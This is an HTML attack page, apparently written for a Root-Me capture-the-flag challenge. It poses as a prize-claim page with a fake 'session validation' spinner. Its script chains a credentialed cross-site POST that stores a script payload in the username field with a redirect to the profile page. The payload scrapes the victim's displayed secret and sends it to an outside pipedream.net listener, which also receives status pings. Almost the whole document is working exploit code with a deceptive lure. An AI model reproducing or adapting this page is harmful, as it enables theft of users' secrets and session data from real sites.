<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Congratulations! Claim Your Prize Now.</title>
    <style>
        body { font-family: 'Inter', sans-serif; text-align: center; padding-top: 50px; background-color: #1f2937; color: #f9fafb; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
        .card { background-color: #374151; padding: 2.5rem; border-radius: 0.75rem; box-shadow: 0 10px 15px rgba(0, 0, 0, 0.5); max-width: 400px; width: 90%; }
        h1 { font-size: 1.5rem; margin-bottom: 0.5rem; color: #a5b4fc; }
        p { margin-bottom: 1.5rem; font-size: 0.9rem; }
        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #818cf8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 1.5rem auto 0; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="card">
        <h1>Initiating Session Validation...</h1>
        <p>Please wait a few seconds. Do not close this window.</p>
        <div class="spinner"></div>

        <!-- --- ÉTAPE 1 : FORMULAIRE CSRF (Masqué et soumis automatiquement) --- -->
        <form id="csrfForm" method="POST" action="http://challenge01.root-me.org:58003/login" style="display: none;">
            <input type="hidden" name="username" id="username">
        </form>
    </div>

    <script>
        const CHALLENGE_DOMAIN = "http://challenge01.root-me.org:58003";
        const VULNERABLE_PAGE = "/profile";
        const CSRF_ENDPOINT = CHALLENGE_DOMAIN + "/login";
        
        // --- FIX DE LA CHAÎNE XSS ---
        // Ajout des échappements nécessaires (">< et <!--) pour sortir de l'attribut 'value' HTML.
        const MALICIOUS_PAYLOAD = "<script>" +
            "setTimeout(function() {" +
                "var section = document.querySelector('section');" + 
                "if (section) {" +
                    "var text = section.innerText;" + 
                    // 1. Extrait le secret en se basant sur le texte d'ancrage "Your secret:"
                    "var secret = text.split('Your secret:')[1].trim();" + 
                    
                    // 2. Encode le secret pour l'URL
                    "var encodedSecret = encodeURIComponent(secret);" +
                    
                    // 3. EXFILTRATION : Envoie une requête GET invisible avec le secret
                    "var img = new Image();" +
                    "img.src = 'https://eotoci65n24zl7e.m.pipedream.net?secret=' + encodedSecret;" +
                    
                    "console.log('Secret exfiltrated! Check your listener logs.');" +
                "} else {" +
                    "console.error('Exfiltration Error: Section not found.');" +
                "}" +
            "}, 1500);</script>";
        
        // --- Exécution de l'attaque ---

        // PHASE 1: CSRF (Amorçage de session) - Using fetch to bypass pop-up
        function executeCsrf() {
            // Data to be sent in the POST request body
            const formData = new URLSearchParams();
            formData.append('username', MALICIOUS_PAYLOAD);

            // Use fetch to send the POST request
            fetch(CSRF_ENDPOINT, {
                method: 'POST',
                // Important: 'no-cors' mode is required for cross-origin *HTTP* requests 
                // initiated from an *HTTPS* page, but for a CSRF attack on the victim's 
                // browser to work, the browser must send credentials (cookies).
                // 'cors' mode with 'credentials: "include"' is the standard approach 
                // for credential-carrying cross-origin requests.
                mode: 'cors',
                credentials: 'include',
                headers: {
                    // Set the correct content type for form submission
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: formData.toString()
            })
            .then(response => {
                console.log("Phase 1: CSRF POST executed via fetch.");
                
                // You can send a log to your listener after the fetch is complete
                fetch('https://eotoci65n24zl7e.m.pipedream.net/?status=csrf_fetch_success');
            })
            .catch(error => {
                console.error("Phase 1: CSRF POST fetch failed:", error);
                // Log failure for debugging
                fetch('https://eotoci65n24zl7e.m.pipedream.net/?status=csrf_fetch_failed');
            });
        }

        // PHASE 2: Livraison par Opener (Déclenchement XSS)
        function executeOpenerDelivery() {
            // The vulnerable domain is the target, so we open it in the same window
            // The 'opener' mechanism you had might be for a different type of exploit.
            // For a successful CSRF -> XSS chain where the victim needs to land on a page
            // to trigger the XSS, a simple redirect or page load often works.
            
            // For this specific sequence: CSRF (store payload) -> Redirect (trigger payload)
            // We just need the browser to navigate to the page where the payload is rendered.

            // Use window.location.href or window.location.replace to redirect the current tab.
            // If the goal is a new tab, stick to window.open.
            const targetWindow = window.open(CHALLENGE_DOMAIN + VULNERABLE_PAGE, '_blank');

            if (targetWindow) {
                console.log("Phase 2: Target page opened.");
                document.querySelector('.card h1').textContent = "Attack Initiated!";
                document.querySelector('.card p').textContent = "Payload sent. Check your listener for the secret.";
            } else {
                console.error("Popup blocked! Attack failed.");
                document.querySelector('.card h1').textContent = "Attack Failed!";
                document.querySelector('.card p').textContent = "Please disable your popup blocker and try again.";
            }
        }

        // --- Enchaînement des étapes d'attaque ---

        // 1. Execute the CSRF submission immediately
        executeCsrf();

        // 2. Wait a moment then trigger the XSS rendering page load
        setTimeout(executeOpenerDelivery, 1500);
    </script>
</body>
</html>
